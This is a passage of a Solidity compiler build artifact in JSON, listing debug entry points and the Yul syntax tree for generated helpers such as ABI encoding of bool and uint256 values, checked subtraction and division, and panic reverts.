									"returnSlots": 0
								},
								"abi_encode_t_uint256_to_t_uint256_fromStack": {
									"entryPoint": 428,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed": {
									"entryPoint": 394,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed": {
									"entryPoint": 443,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"checked_div_t_uint256": {
									"entryPoint": 609,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_sub_t_uint256": {
									"entryPoint": 513,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 283,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 419,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"increment_t_uint256": {
									"entryPoint": 657,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"panic_error_0x11": {
									"entryPoint": 468,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"panic_error_0x12": {
									"entryPoint": 564,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 279,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_bool": {
									"entryPoint": 294,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:2785:2",
										"nodeType": "YulBlock",
										"src": "0:2785:2",
										"statements": [
											{
												"body": {
													"nativeSrc": "47:35:2",
													"nodeType": "YulBlock",
													"src": "47:35:2",
													"statements": [
														{
															"nativeSrc": "57:19:2",
															"nodeType": "YulAssignment",
															"src": "57:19:2",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "73:2:2",
																		"nodeType": "YulLiteral",
																		"src": "73:2:2",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "67:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:2"
																},
																"nativeSrc": "67:9:2",
																"nodeType": "YulFunctionCall",
																"src": "67:9:2"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nativeSrc": "57:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:2"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nativeSrc": "7:75:2",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nativeSrc": "40:6:2",
														"nodeType": "YulTypedName",
														"src": "40:6:2",
														"type": ""
													}
												],
												"src": "7:75:2"
											},
											{
												"body": {
													"nativeSrc": "177:28:2",
													"nodeType": "YulBlock",
													"src": "177:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "194:1:2",
																		"nodeType": "YulLiteral",
																		"src": "194:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "197:1:2",
																		"nodeType": "YulLiteral",
																		"src": "197:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "187:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:2"
																},
																"nativeSrc": "187:12:2",
																"nodeType": "YulFunctionCall",
																"src": "187:12:2"
															},
															"nativeSrc": "187:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "187:12:2"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nativeSrc": "88:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:2"
											},
											{
												"body": {
													"nativeSrc": "300:28:2",
													"nodeType": "YulBlock",
													"src": "300:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "317:1:2",
																		"nodeType": "YulLiteral",
																		"src": "317:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "320:1:2",
																		"nodeType": "YulLiteral",
																		"src": "320:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "310:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:2"
																},
																"nativeSrc": "310:12:2",
																"nodeType": "YulFunctionCall",
																"src": "310:12:2"
															},
															"nativeSrc": "310:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "310:12:2"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nativeSrc": "211:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:2"
											},
											{
												"body": {
													"nativeSrc": "376:48:2",
													"nodeType": "YulBlock",
													"src": "376:48:2",
													"statements": [
														{
															"nativeSrc": "386:32:2",
															"nodeType": "YulAssignment",
															"src": "386:32:2",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "411:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "411:5:2"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nativeSrc": "404:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "404:6:2"
																		},
																		"nativeSrc": "404:13:2",
																		"nodeType": "YulFunctionCall",
																		"src": "404:13:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "397:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "397:6:2"
																},
																"nativeSrc": "397:21:2",
																"nodeType": "YulFunctionCall",
																"src": "397:21:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "386:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "386:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nativeSrc": "334:90:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "358:5:2",
														"nodeType": "YulTypedName",
														"src": "358:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "368:7:2",
														"nodeType": "YulTypedName",
														"src": "368:7:2",
														"type": ""
													}
												],
												"src": "334:90:2"
											},
											{
												"body": {
													"nativeSrc": "470:76:2",
													"nodeType": "YulBlock",
													"src": "470:76:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "524:16:2",
																"nodeType": "YulBlock",
																"src": "524:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "533:1:2",
																					"nodeType": "YulLiteral",
																					"src": "533:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "536:1:2",
																					"nodeType": "YulLiteral",
																					"src": "536:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "526:6:2",
																				"nodeType": "YulIdentifier",
																				"src": "526:6:2"
																			},
																			"nativeSrc": "526:12:2",
																			"nodeType": "YulFunctionCall",
																			"src": "526:12:2"
																		},
																		"nativeSrc": "526:12:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "526:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "493:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "493:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "515:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "515:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nativeSrc": "500:14:2",
																					"nodeType": "YulIdentifier",
																					"src": "500:14:2"
																				},
																				"nativeSrc": "500:21:2",
																				"nodeType": "YulFunctionCall",
																				"src": "500:21:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "490:2:2",
																			"nodeType": "YulIdentifier",
																			"src": "490:2:2"
																		},
																		"nativeSrc": "490:32:2",
																		"nodeType": "YulFunctionCall",
																		"src": "490:32:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "483:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "483:6:2"
																},
																"nativeSrc": "483:40:2",
																"nodeType": "YulFunctionCall",
																"src": "483:40:2"
															},
															"nativeSrc": "480:60:2",
															"nodeType": "YulIf",
															"src": "480:60:2"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nativeSrc": "430:116:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "463:5:2",
														"nodeType": "YulTypedName",
														"src": "463:5:2",
														"type": ""
													}
												],
												"src": "430:116:2"
											},
											{
												"body": {
													"nativeSrc": "601:84:2",
													"nodeType": "YulBlock",
													"src": "601:84:2",
													"statements": [
														{
															"nativeSrc": "611:29:2",
															"nodeType": "YulAssignment",
															"src": "611:29:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "633:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "633:6:2"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nativeSrc": "620:12:2",
																	"nodeType": "YulIdentifier",
																	"src": "620:12:2"
																},
																"nativeSrc": "620:20:2",
																"nodeType": "YulFunctionCall",
																"src": "620:20:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "611:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "611:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "673:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "673:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nativeSrc": "649:23:2",
																	"nodeType": "YulIdentifier",
																	"src": "649:23:2"
																},
																"nativeSrc": "649:30:2",
																"nodeType": "YulFunctionCall",
																"src": "649:30:2"
															},
															"nativeSrc": "649:30:2",
															"nodeType": "YulExpressionStatement",
															"src": "649:30:2"
														}
													]
												},
												"name": "abi_decode_t_bool",
												"nativeSrc": "552:133:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "579:6:2",
														"nodeType": "YulTypedName",
														"src": "579:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "587:3:2",
														"nodeType": "YulTypedName",
														"src": "587:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "595:5:2",
														"nodeType": "YulTypedName",
														"src": "595:5:2",
														"type": ""
													}
												],
												"src": "552:133:2"
											},
											{
												"body": {
													"nativeSrc": "754:260:2",
													"nodeType": "YulBlock",
													"src": "754:260:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "800:83:2",
																"nodeType": "YulBlock",
																"src": "800:83:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "802:77:2",
																				"nodeType": "YulIdentifier",
																				"src": "802:77:2"
																			},
																			"nativeSrc": "802:79:2",
																			"nodeType": "YulFunctionCall",
																			"src": "802:79:2"
																		},
																		"nativeSrc": "802:79:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "802:79:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "775:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "775:7:2"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "784:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "784:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "771:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "771:3:2"
																		},
																		"nativeSrc": "771:23:2",
																		"nodeType": "YulFunctionCall",
																		"src": "771:23:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "796:2:2",
																		"nodeType": "YulLiteral",
																		"src": "796:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "767:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "767:3:2"
																},
																"nativeSrc": "767:32:2",
																"nodeType": "YulFunctionCall",
																"src": "767:32:2"
															},
															"nativeSrc": "764:119:2",
															"nodeType": "YulIf",
															"src": "764:119:2"
														},
														{
															"nativeSrc": "893:114:2",
															"nodeType": "YulBlock",
															"src": "893:114:2",
															"statements": [
																{
																	"nativeSrc": "908:15:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "908:15:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "922:1:2",
																		"nodeType": "YulLiteral",
																		"src": "922:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "912:6:2",
																			"nodeType": "YulTypedName",
																			"src": "912:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "937:60:2",
																	"nodeType": "YulAssignment",
																	"src": "937:60:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "969:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "969:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "980:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "980:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "965:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "965:3:2"
																				},
																				"nativeSrc": "965:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "965:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "989:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "989:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool",
																			"nativeSrc": "947:17:2",
																			"nodeType": "YulIdentifier",
																			"src": "947:17:2"
																		},
																		"nativeSrc": "947:50:2",
																		"nodeType": "YulFunctionCall",
																		"src": "947:50:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "937:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "937:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool",
												"nativeSrc": "691:323:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "724:9:2",
														"nodeType": "YulTypedName",
														"src": "724:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "735:7:2",
														"nodeType": "YulTypedName",
														"src": "735:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "747:6:2",
														"nodeType": "YulTypedName",
														"src": "747:6:2",
														"type": ""
													}
												],
												"src": "691:323:2"
											},
											{
												"body": {
													"nativeSrc": "1079:50:2",
													"nodeType": "YulBlock",
													"src": "1079:50:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "1096:3:2",
																		"nodeType": "YulIdentifier",
																		"src": "1096:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "1116:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "1116:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nativeSrc": "1101:14:2",
																			"nodeType": "YulIdentifier",
																			"src": "1101:14:2"
																		},
																		"nativeSrc": "1101:21:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1101:21:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1089:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1089:6:2"
																},
																"nativeSrc": "1089:34:2",
																"nodeType": "YulFunctionCall",
																"src": "1089:34:2"
															},
															"nativeSrc": "1089:34:2",
															"nodeType": "YulExpressionStatement",
															"src": "1089:34:2"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nativeSrc": "1020:109:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1067:5:2",
														"nodeType": "YulTypedName",
														"src": "1067:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "1074:3:2",
														"nodeType": "YulTypedName",
														"src": "1074:3:2",
														"type": ""
													}
												],
												"src": "1020:109:2"
											},
											{
												"body": {
													"nativeSrc": "1227:118:2",
													"nodeType": "YulBlock",
													"src": "1227:118:2",
													"statements": [
														{
															"nativeSrc": "1237:26:2",
															"nodeType": "YulAssignment",
															"src": "1237:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "1249:9:2",
																		"nodeType": "YulIdentifier",
																		"src": "1249:9:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1260:2:2",
																		"nodeType": "YulLiteral",
																		"src": "1260:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "1245:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "1245:3:2"
																},
																"nativeSrc": "1245:18:2",
																"nodeType": "YulFunctionCall",
																"src": "1245:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "1237:4:2",
																	"nodeType": "YulIdentifier",
																	"src": "1237:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nativeSrc": "1311:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "1311:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "1324:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "1324:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "1335:1:2",
																				"nodeType": "YulLiteral",
																				"src": "1335:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "1320:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "1320:3:2"
																		},
																		"nativeSrc": "1320:17:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1320:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nativeSrc": "1273:37:2",
																	"nodeType": "YulIdentifier",
																	"src": "1273:37:2"
																},
																"nativeSrc": "1273:65:2",
																"nodeType": "YulFunctionCall",
																"src": "1273:65:2"
															},
															"nativeSrc": "1273:65:2",
															"nodeType": "YulExpressionStatement",
															"src": "1273:65:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nativeSrc": "1135:210:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "1199:9:2",
														"nodeType": "YulTypedName",
														"src": "1199:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nativeSrc": "1211:6:2",
														"nodeType": "YulTypedName",
														"src": "1211:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "1222:4:2",
														"nodeType": "YulTypedName",
														"src": "1222:4:2",
														"type": ""
													}
												],
												"src": "1135:210:2"
											},
											{
												"body": {
													"nativeSrc": "1396:32:2",
													"nodeType": "YulBlock",
													"src": "1396:32:2",
													"statements": [
														{
															"nativeSrc": "1406:16:2",
															"nodeType": "YulAssignment",
															"src": "1406:16:2",
															"value": {
																"name": "value",
																"nativeSrc": "1417:5:2",
																"nodeType": "YulIdentifier",
																"src": "1417:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "1406:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "1406:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nativeSrc": "1351:77:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1378:5:2",
														"nodeType": "YulTypedName",
														"src": "1378:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "1388:7:2",
														"nodeType": "YulTypedName",
														"src": "1388:7:2",
														"type": ""
													}
												],
												"src": "1351:77:2"
											},
											{
												"body": {
													"nativeSrc": "1499:53:2",
													"nodeType": "YulBlock",
													"src": "1499:53:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "1516:3:2",
																		"nodeType": "YulIdentifier",
																		"src": "1516:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "1539:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "1539:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nativeSrc": "1521:17:2",
																			"nodeType": "YulIdentifier",
																			"src": "1521:17:2"
																		},
																		"nativeSrc": "1521:24:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1521:24:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1509:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1509:6:2"
																},
																"nativeSrc": "1509:37:2",
																"nodeType": "YulFunctionCall",
																"src": "1509:37:2"
															},
															"nativeSrc": "1509:37:2",
															"nodeType": "YulExpressionStatement",
															"src": "1509:37:2"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nativeSrc": "1434:118:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1487:5:2",
														"nodeType": "YulTypedName",
														"src": "1487:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "1494:3:2",
														"nodeType": "YulTypedName",
														"src": "1494:3:2",
														"type": ""
													}
												],
												"src": "1434:118:2"
											},
											{
												"body": {
													"nativeSrc": "1656:124:2",
													"nodeType": "YulBlock",
													"src": "1656:124:2",
													"statements": [
														{
															"nativeSrc": "1666:26:2",
															"nodeType": "YulAssignment",
															"src": "1666:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "1678:9:2",
																		"nodeType": "YulIdentifier",
																		"src": "1678:9:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1689:2:2",
																		"nodeType": "YulLiteral",
																		"src": "1689:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "1674:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "1674:3:2"
																},
																"nativeSrc": "1674:18:2",
																"nodeType": "YulFunctionCall",
																"src": "1674:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "1666:4:2",
																	"nodeType": "YulIdentifier",
																	"src": "1666:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nativeSrc": "1746:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "1746:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "1759:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "1759:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "1770:1:2",
																				"nodeType": "YulLiteral",
																				"src": "1770:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "1755:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "1755:3:2"
																		},
																		"nativeSrc": "1755:17:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1755:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nativeSrc": "1702:43:2",
																	"nodeType": "YulIdentifier",
																	"src": "1702:43:2"
																},
																"nativeSrc": "1702:71:2",
																"nodeType": "YulFunctionCall",
																"src": "1702:71:2"
															},
															"nativeSrc": "1702:71:2",
															"nodeType": "YulExpressionStatement",
															"src": "1702:71:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nativeSrc": "1558:222:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "1628:9:2",
														"nodeType": "YulTypedName",
														"src": "1628:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nativeSrc": "1640:6:2",
														"nodeType": "YulTypedName",
														"src": "1640:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "1651:4:2",
														"nodeType": "YulTypedName",
														"src": "1651:4:2",
														"type": ""
													}
												],
												"src": "1558:222:2"
											},
											{
												"body": {
													"nativeSrc": "1814:152:2",
													"nodeType": "YulBlock",
													"src": "1814:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "1831:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1831:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1834:77:2",
																		"nodeType": "YulLiteral",
																		"src": "1834:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1824:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1824:6:2"
																},
																"nativeSrc": "1824:88:2",
																"nodeType": "YulFunctionCall",
																"src": "1824:88:2"
															},
															"nativeSrc": "1824:88:2",
															"nodeType": "YulExpressionStatement",
															"src": "1824:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "1928:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1928:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1931:4:2",
																		"nodeType": "YulLiteral",
																		"src": "1931:4:2",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1921:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1921:6:2"
																},
																"nativeSrc": "1921:15:2",
																"nodeType": "YulFunctionCall",
																"src": "1921:15:2"
															},
															"nativeSrc": "1921:15:2",
															"nodeType": "YulExpressionStatement",
															"src": "1921:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "1952:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1952:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1955:4:2",
																		"nodeType": "YulLiteral",
																		"src": "1955:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "1945:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1945:6:2"
																},
																"nativeSrc": "1945:15:2",
																"nodeType": "YulFunctionCall",
																"src": "1945:15:2"
															},
															"nativeSrc": "1945:15:2",
															"nodeType": "YulExpressionStatement",
															"src": "1945:15:2"
														}
													]
												},
												"name": "panic_error_0x11",
												"nativeSrc": "1786:180:2",
												"nodeType": "YulFunctionDefinition",
												"src": "1786:180:2"
											},
											{
												"body": {
													"nativeSrc": "2017:149:2",
													"nodeType": "YulBlock",
													"src": "2017:149:2",
													"statements": [
														{
															"nativeSrc": "2027:25:2",
															"nodeType": "YulAssignment",
															"src": "2027:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nativeSrc": "2050:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2050:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "2032:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "2032:17:2"
																},
																"nativeSrc": "2032:20:2",
																"nodeType": "YulFunctionCall",
																"src": "2032:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nativeSrc": "2027:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "2027:1:2"
																}
															]
														},
														{
															"nativeSrc": "2061:25:2",
															"nodeType": "YulAssignment",
															"src": "2061:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nativeSrc": "2084:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2084:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "2066:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "2066:17:2"
																},
																"nativeSrc": "2066:20:2",
																"nodeType": "YulFunctionCall",
																"src": "2066:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nativeSrc": "2061:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "2061:1:2"
																}
															]
														},
														{
															"nativeSrc": "2095:17:2",
															"nodeType": "YulAssignment",
															"src": "2095:17:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nativeSrc": "2107:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2107:1:2"
																	},
																	{
																		"name": "y",
																		"nativeSrc": "2110:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2110:1:2"
																	}
																],
																"functionName": {
																	"name": "sub",
